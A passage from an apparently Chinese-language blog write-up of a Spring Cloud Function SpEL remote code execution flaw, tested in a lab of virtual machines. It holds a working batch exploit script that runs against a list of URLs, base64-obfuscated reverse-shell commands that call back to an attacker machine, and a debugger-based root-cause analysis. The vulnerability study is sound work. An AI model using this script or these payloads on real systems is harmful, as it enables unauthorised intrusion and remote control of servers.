</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> threading
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> urllib3
</span></span><span style="display:flex;"><span>urllib3.disable_warnings()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> scan(txt,cmd):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># payload1=f&#39;T(java.lang.Runtime).getRuntime().exec(&#34;{cmd}&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>    payload = <span style="color:#0ff;font-weight:bold">&#34;new ProcessBuilder(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;).start()&#34;</span>
</span></span><span style="display:flex;"><span>    data =<span style="color:#0ff;font-weight:bold">&#39;test&#39;</span>
</span></span><span style="display:flex;"><span>    headers = {
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;spring.cloud.function.routing-expression&#39;</span>:payload,
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;Accept-Encoding&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;gzip, deflate&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;Accept&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;*/*&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;Accept-Language&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;en&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;User-Agent&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#0ff;font-weight:bold">&#39;Content-Type&#39;</span>: <span style="color:#0ff;font-weight:bold">&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    path = <span style="color:#0ff;font-weight:bold">&#39;/functionRouter&#39;</span>
</span></span><span style="display:flex;"><span>    f = <span style="color:#fff;font-weight:bold">open</span>(txt)
</span></span><span style="display:flex;"><span>    urllist=f.readlines()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span>  url  in  urllist :
</span></span><span style="display:flex;"><span>        url = url.strip(<span style="color:#0ff;font-weight:bold">&#39;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">all</span> = url + path
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>            req=requests.post(url=<span style="color:#fff;font-weight:bold">all</span>,headers=headers,data=data,verify=<span style="color:#fff;font-weight:bold">False</span>,timeout=<span style="color:#ff0;font-weight:bold">3</span>)
</span></span><span style="display:flex;"><span>            code =req.status_code
</span></span><span style="display:flex;"><span>            text = req.text
</span></span><span style="display:flex;"><span>            rsp = <span style="color:#0ff;font-weight:bold">&#39;&#34;error&#34;:&#34;Internal Server Error&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> code == <span style="color:#ff0;font-weight:bold">500</span> and rsp in text:
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">print</span> ( <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#39;[+] </span><span style="color:#0ff;font-weight:bold">{</span> url <span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> is vulnerable&#39;</span> )
</span></span><span style="display:flex;"><span>                poc_file = <span style="color:#fff;font-weight:bold">open</span>(<span style="color:#0ff;font-weight:bold">&#39;vulnerable.txt&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;a+&#39;</span>)
</span></span><span style="display:flex;"><span>                poc_file.write(url + <span style="color:#0ff;font-weight:bold">&#39;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>)
</span></span><span style="display:flex;"><span>                poc_file.close()
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">print</span> ( <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#39;[-] </span><span style="color:#0ff;font-weight:bold">{</span> url <span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> not vulnerable&#39;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">except</span> requests.exceptions.RequestException:
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span> ( <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#39;[-] </span><span style="color:#0ff;font-weight:bold">{</span> url <span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> detection timed out&#39;</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span> ( <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#39;[-] </span><span style="color:#0ff;font-weight:bold">{</span> url <span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> error&#39;</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span> :
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        cmd1 =sys.argv[<span style="color:#ff0;font-weight:bold">1</span>]
</span></span><span style="display:flex;"><span>        t = threading . Thread ( target = scan ( cmd1 , <span style="color:#0ff;font-weight:bold">&#39;whoami&#39;</span> ) ) 
</span></span><span style="display:flex;"><span>        t.start()
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span> ( <span style="color:#0ff;font-weight:bold">&#39;Usage:&#39;</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#39;python poc.py url.txt&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>这里我们需要将我们需要进行cve执行的ip都存放到一个文件夹(<code>比如ip.txt</code>)里面</li>
<li>执行的时候调用<code>python3 exp.py ip.txt</code>即可
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220627224728413.png" alt="image-20220627224728413"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="反弹shell">反弹shell<a hidden class="anchor" aria-hidden="true" href="#反弹shell">#</a></h2>
<ul>
<li>我们可以通过反弹shell拿到稳定的shell</li>
</ul>
<h3 id="本地实现">本地实现<a hidden class="anchor" aria-hidden="true" href="#本地实现">#</a></h3>
<ul>
<li>
<p>这里是通过本机的两个端口实现。</p>
</li>
<li>
<p>命令准备</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>反弹shell命令：
</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8899 0&gt;&amp;1
</span></span><span style="display:flex;"><span>base64加密：
</span></span><span style="display:flex;"><span>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>修改数据包后，发送数据包：</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629003530499.png" alt="image-20220629003530499"  />
</li>
</ul>
</li>
<li>
<p>同时在本机用<code>nc -l 8899 监听8899</code>发送来的信息。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629003642404.png" alt="image-20220629003642404"  />
</li>
<li>数据包发送完毕之后</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629003720267.png" alt="image-20220629003720267"  />
</li>
<li>由此拿到稳定的<code>shell</code></li>
<li><a href="https://blog.csdn.net/xhwfa/article/details/124307153">https://blog.csdn.net/xhwfa/article/details/124307153</a></li>
</ul>
</li>
</ul>
<h3 id="两个虚拟机实现">两个虚拟机实现<a hidden class="anchor" aria-hidden="true" href="#两个虚拟机实现">#</a></h3>
<ul>
<li>
<p>靶机：ubuntu 18 : IP:<code>192.168.195.13</code>3</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113037926.png" alt="image-20220629113037926"  />
</li>
</ul>
</li>
<li>
<p>攻击机:kali linux : IP:<code>192.168.195.131</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113131044.png" alt="image-20220629113131044"  />
</li>
</ul>
</li>
<li>
<p>在攻击机开启<code>nc -lvvp 8899</code>对8899端口进行监听</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113234709.png" alt="image-20220629113234709"  />
</li>
</ul>
</li>
<li>
<p>同时攻击机对exp脚本进行运行</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113316719.png" alt="image-20220629113316719"  />
</li>
</ul>
</li>
<li>
<p>拿到shell</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113333907.png" alt="image-20220629113333907"  />
</li>
</ul>
</li>
<li>
<p>exp脚本：</p>
<ul>
<li>
<p>即为将上面的通用脚本里面的<code>payload</code>改写一下即可</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>payload = &#39;T(java.lang.Runtime).getRuntime().exec(&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjczLjEzMS84ODk5IDA+JjE=}|{base64,-d}|{bash,-i}&#34;)&#39;
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220629113525297.png" alt="image-20220629113525297"  />
</p>
</li>
</ul>
</li>
</ul>
<h2 id="原理分析">原理分析<a hidden class="anchor" aria-hidden="true" href="#原理分析">#</a></h2>
<ul>
<li>
<p>根据漏洞原理及官方测试用例可以知晓漏洞触发点在<code>http header</code>中<code>spring.cloud.function.routing-expression</code>字段。</p>
</li>
<li>
<p>在命令执行出下断点，看下程序执行流程。</p>
<p><code>SpringCloud Function</code>之所以能自动将函数建立http端点，是因为在包<code>mvc.FunctionController</code>中使用<code>/**</code> 监听了<code>get/post</code>类型的所有端点。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220627235205810.png" alt="image-20220627235205810"  />
</li>
</ul>
</li>
<li>
<p>1、当一个请求进入时，程序首先基于<code>Springboot</code>的自动配置，调用处理器，随后将以<code>“WebRequestConstants.handler”</code>为key，<code>function</code>为值添加到request数组里面。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220627235446419.png" alt="image-20220627235446419"  />
</li>
</ul>
</li>
<li>
<p>2、根据上述分析，我们发现对数据包封装好之后，我们都需要调用函数<code>processRequest</code>，我们直接在<code>processRequest</code>打断点</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628001851141.png" alt="image-20220628001851141"  />
</li>
<li>可以发现<code>wrapper</code>封装的即为我们的<code>HTTP</code>头</li>
<li>同时查看参数<code>function</code>,发现其<code>functionDefinition</code>为<code>functionRouter</code>
<ul>
<li>如果设置为functionRouter则默认路由绑定的具体函数<strong>交由用户进行控制</strong>，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用<code>spring.cloud.function.definition</code> 和<code>spring.cloud.function.routing-expression</code> 都可以，<strong>区别是后者允许使用Spring表达式语言（SpEL）</strong>。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628002348237.png" alt="image-20220628002348237"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>3、通过判断后执行<code>function</code>的<code>apply</code>方法</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628002546254.png" alt="image-20220628002546254"  />
</p>
</li>
<li>
<p>然后在<code>apply</code>中执行<code>doaply</code>方法</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628002628399.png" alt="image-20220628002628399"  />
</p>
</li>
</ul>
</li>
<li>
<p>4、判断是不是<code>functionRouter</code>方法，判断当前的类型，是<code>RouteFunction</code>或者<code>Composed</code>直接跳转到<code>else</code>，执行自己的<code>apply</code>方法，这里是<code>functionRouter</code>，我们直接就执行<code>funtionRouter</code>的<code>apply</code>方法</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628002819104.png" alt="image-20220628002819104"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628003058622.png" alt="image-20220628003058622"  />
</li>
<li>发现在<code>functionRouter</code>的<code>apply</code>方法中实际上调用的是<code>route</code>方法</li>
</ul>
</li>
<li>
<p>5、分析<code>route</code>方法</p>
<ul>
<li>
<p>因为<code>function</code>为<code>null</code>,直接进入<code>if-else</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628003324975.png" alt="image-20220628003324975"  />
</li>
</ul>
</li>
<li>
<p>可以看到程序检查headers参数中是否有<code>“spring.cloud.function.definition”</code>或者<code>“spring.cloud.function.routing-expression“</code>字段，并进行相应的处理。如果是<code>spring.cloud.function.routing-expression</code> ，则调用 <code>functionFromExpression()</code>方法处理。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628003618654.png" alt="image-20220628003618654"  />
</p>
</li>
</ul>
</li>
<li>
<p>6、跟进到<code>functionFromExpression</code>方法中，参数中<code>routingExpression</code>，可以看一下该参数为<code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code>，也就是<code>header</code>中传入的。传入后由<code>spelParser.parseExpression（）</code>处理。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628004318685.png" alt="image-20220628004318685"  />
</li>
</ul>
</li>
<li>
<p>7、漏洞也就是在这里SpEL表达式解析，进行触发。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220628004417503.png" alt="image-20220628004417503"  />
</li>
</ul>
</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/rce/">RCE</a></li>
      <li><a href="/tags/spring%E6%BC%8F%E6%B4%9E/">Spring漏洞</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="/posts/tech/go%E5%8E%9F%E7%94%9Fnet%E5%8C%85%E5%88%86%E6%9E%90/">
    <span class="title">« Prev</span>
    <br>
    <span>Go原生net包分析</span>
  </a>
  <a class="next" href="/posts/tech/springboot/">
    <span class="title">Next »</span>
    <br>
    <span>SpringBoot</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
